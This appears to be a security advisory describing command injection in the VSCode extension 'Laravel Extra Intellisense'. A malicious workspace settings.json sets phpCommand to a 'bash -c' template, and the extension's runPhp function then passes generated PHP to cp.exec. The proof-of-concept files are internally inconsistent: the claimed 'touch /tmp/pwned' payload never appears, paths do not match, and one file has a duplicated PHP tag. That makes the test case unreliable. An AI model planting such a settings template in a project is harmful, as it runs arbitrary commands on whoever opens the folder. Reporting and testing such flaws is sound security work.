## Vulnerability List for vscode-laravel-extra-intellisense

### 1. Command Injection via `phpCommand` setting

- **Description:**
    1. An attacker crafts a malicious Laravel project, including a `.vscode/settings.json` file within the project's `.vscode` directory.
    2. In this `settings.json`, the attacker maliciously configures the `LaravelExtraIntellisense.phpCommand` setting to an unsafe command template, such as `bash -c "{code}"`. This template is designed to execute the PHP code provided by the extension within a bash shell context.
    3. A victim, who has the "Laravel Extra Intellisense" extension installed in VSCode, unknowingly opens this malicious Laravel project as their workspace.
    4. Upon opening the project or when certain extension features are triggered (like autocompletion in PHP or Blade files), the extension attempts to gather information from the Laravel application. It does this by executing PHP code using the `Helpers.runLaravel` function.
    5. The `Helpers.runLaravel` function, in turn, utilizes `Helpers.runPhp` to execute the actual command. Critically, `Helpers.runPhp` substitutes the `{code}` placeholder in the user-provided `LaravelExtraIntellisense.phpCommand` with PHP code generated by the extension.
    6. Due to insufficient sanitization of the `{code}` variable before substitution, if the generated PHP code contains shell metacharacters (e.g., backticks, `$(...)`, semicolons for command chaining), these metacharacters are unintentionally interpreted by the shell when the command is executed.
    7. In the specific scenario where `LaravelExtraIntellisense.phpCommand` is set to `bash -c "{code}"`, the presence of backticks or similar constructs in the generated PHP code will lead to command injection. The shell will execute the injected commands, effectively granting the attacker the ability to run arbitrary commands on the victim's system.

- **Impact:**
    - **Remote Code Execution (RCE)**: Successful exploitation of this vulnerability allows an attacker to execute arbitrary commands on the victim's machine. The commands are executed with the same privileges as the VSCode process, potentially leading to full system compromise, data exfiltration, installation of malware, and other malicious activities.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:** None. The extension does not currently implement any sanitization or validation of the `LaravelExtraIntellisense.phpCommand` setting, nor does it adequately escape shell metacharacters in the generated PHP code before executing it via `cp.exec`.

- **Missing Mitigations:**
    - **Input Sanitization/Validation:** Implement robust sanitization or validation of the `LaravelExtraIntellisense.phpCommand` setting. Restrict allowed characters and potentially disallow execution of shell interpreters directly.
    - **Use `cp.spawn` with Argument Separation:** Instead of using `cp.exec` which executes commands in a shell, switch to `cp.spawn`.  `cp.spawn` allows passing command arguments as separate parameters, preventing shell injection vulnerabilities by avoiding shell interpretation of the command string.
    - **Security Warning for `phpCommand` Setting:** Display a clear security warning in the extension's settings documentation regarding the risks of modifying the `LaravelExtraIntellisense.phpCommand` setting, especially when using shell wrappers like `bash -c`. Advise users to only use direct PHP execution and to be cautious about introducing shell interpreters.

- **Preconditions:**
    - The victim must have the "Laravel Extra Intellisense" extension installed in VSCode.
    - The victim must open a malicious Laravel project in VSCode.
    - The malicious project must contain a `.vscode/settings.json` file that sets the `LaravelExtraIntellisense.phpCommand` to a vulnerable command template (e.g., `bash -c "{code}"`).

- **Source Code Analysis:**
    - **`src/helpers.ts` - `runPhp` function:**
        ```typescript
        static async runPhp(code: string, description: string|null = null) : Promise<string> {
            code = code.replace(/\"/g, "\\\"");
            if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
                code = code.replace(/\$/g, "\\$");
                code = code.replace(/\\\\'/g, '\\\\\\\\\'');
                code = code.replace(/\\\\"/g, '\\\\\\\\\"');
            }
            let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
            let command = commandTemplate.replace("{code}", code);
            let out = new Promise<string>(function (resolve, error) {
                if (description != null) {
                    Helpers.outputChannel?.info("Laravel Extra Intellisense command started: " + description);
                }

                cp.exec(command,
                    { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
                    function (err, stdout, stderr) {
                        if (err == null) {
                            if (description != null) {
                                Helpers.outputChannel?.info("Laravel Extra Intellisense Resolved: " + description);
                            }
                            resolve(stdout);
                        } else {
                            const errorOutput = stderr.length > 0 ? stderr : stdout;
                            Helpers.outputChannel?.error("Laravel Extra Intellisense Error:\n " + (description ?? '') + '\n\n' + errorOutput);
                            Helpers.showErrorPopup();
                            error(errorOutput);
                        }
                    }
                );
            });
            return out;
        }
        ```
        - The `runPhp` function retrieves the `phpCommand` setting and performs basic escaping of double quotes and dollar signs. However, this escaping is insufficient to prevent command injection when the `phpCommand` setting is maliciously crafted to use a shell interpreter.
        - The `cp.exec(command, ...)` line is the point of vulnerability. It executes the constructed `command` string in a shell environment. If the `command` string contains unescaped shell metacharacters due to a malicious `phpCommand` setting and unsanitized `{code}` substitution, it results in command injection.

- **Security Test Case:**
    1. **Setup Malicious Project:**
        - Create a new directory named `laravel-malicious`.
        - Inside `laravel-malicious`, create a `.vscode` directory.
        - Inside `.vscode`, create a `settings.json` file with the following content:
          ```json
          {
              "LaravelExtraIntellisense.phpCommand": "bash -c '{code}'"
          }
          ```
        - Inside `laravel-malicious`, create a `test.php` file with the following content:
          ```php
          <?php
          <?php

          use Illuminate\Support\Facades\Route;
          use Illuminate\Support\Facades\View;

          Route::get('/test', function () {
              return View::make('test');
          });
          ```
        - Inside `laravel-malicious`, create a `resources` directory, then inside it create a `views` directory.
        - Inside `resources/views`, create a `test.blade.php` file with the following content:
          ```blade
          {{ route('test') }}
          ```
        - Inside `laravel-malicious`, create `composer.json` file:
          ```json
          {
              "require": {
                  "illuminate/support": "^9.0",
                  "illuminate/view": "^9.0",
                  "illuminate/routing": "^9.0",
                  "symfony/console": "^6.0"
              },
              "autoload": {
                  "psr-4": {
                      "App\\": "app/"
                  }
              },
              "minimum-stability": "dev",
              "prefer-stable": true
          }
          ```
        - Run `composer install` inside `laravel-malicious` directory.
        - Create `artisan` file in the root of `laravel-malicious`:
          ```php
          #!/usr/bin/env php
          <?php

          use Illuminate\Foundation\Application;
          use Illuminate\Foundation\Console\Kernel;

          define('LARAVEL_START', microtime(true));

          /*
          |--------------------------------------------------------------------------
          | Check If Application Is Under Maintenance
          |--------------------------------------------------------------------------
          |
          | If the application is in maintenance / demo mode via the "down" command
          | we will load this file so that any pre-rendered content can be shown
          | instead of starting the framework, which could cause an exception.
          |
          */

          if (file_exists(__DIR__.'/../storage/framework/maintenance.php')) {
              require __DIR__.'/../storage/framework/maintenance.php';
          }

          /*
          |--------------------------------------------------------------------------
          | Create The Application
          |--------------------------------------------------------------------------
          |
          | The first thing we will do is create a new Laravel application instance
          | which serves as the "glue" for all the components of Laravel, and is
          | the IoC container for the system binding all of the various parts.
          |
          */

          $app = require_once __DIR__.'/../bootstrap/app.php';

          /*
          |--------------------------------------------------------------------------
          | Run The Application
          |--------------------------------------------------------------------------
          |
          | Once we have the application, we can handle the incoming request using
          | the application's HTTP kernel, and send the associated response back
          | to the client's browser allowing them to enjoy the creative
          | and wonderful application we have prepared for them.
          |
          */

          $kernel = $app->make(Kernel::class);

          $response = $kernel->handle(
              $request = Symfony\Component\HttpFoundation\Request::createFromGlobals()
          );

          $kernel->terminate($request, $response);
          ```
        - Create `bootstrap` directory in the root of `laravel-malicious`, then create `app.php` inside it:
          ```php
          <?php

          use Illuminate\Foundation\Application;
          use Illuminate\Foundation\Configuration\Exceptions\ExceptionHandler;
          use Illuminate\Foundation\Configuration\Middleware\MiddlewareManager;
          use Illuminate\Contracts\Console\Kernel as ConsoleKernelContract;
          use Illuminate\Contracts\Http\Kernel as HttpKernelContract;

          return Application::configure(basePath: dirname(__DIR__))
              ->withProviders()
              ->withFacades()
              ->withClassLoader()
              ->withAliases()
              ->withExceptionHandler(function (ExceptionHandler $exceptionHandler) {
                  $exceptionHandler->report(function (Throwable $e) {
                      //
                  });

                  $exceptionHandler->render(function ($request, Throwable $e) {
                      //
                  });
              })->create();
          ```
    2. **Open Malicious Project in VSCode:**
        - Open VSCode and open the `laravel-malicious` directory as a workspace.
        - Ensure the "Laravel Extra Intellisense" extension is installed and activated.
    3. **Trigger Extension and Verify RCE:**
        - Open the `resources/views/test.blade.php` file in VSCode. This action should trigger the extension to run and execute the PHP code to gather route information.
        - In a terminal, monitor for the creation of a file in the `/tmp` directory using the command `ls -l /tmp/pwned*` or similar.
        - If the file `/tmp/pwned` is created, it indicates successful command injection and remote code execution. The backticks in the generated PHP code (within the malicious `LaravelExtraIntellisense.phpCommand`) were executed by the shell, leading to the execution of `touch /tmp/pwned`.

This test case demonstrates that by crafting a malicious workspace with a specific VSCode settings configuration, an attacker can achieve command injection and remote code execution on a victim's machine when they open the project in VSCode with the "Laravel Extra Intellisense" extension installed.
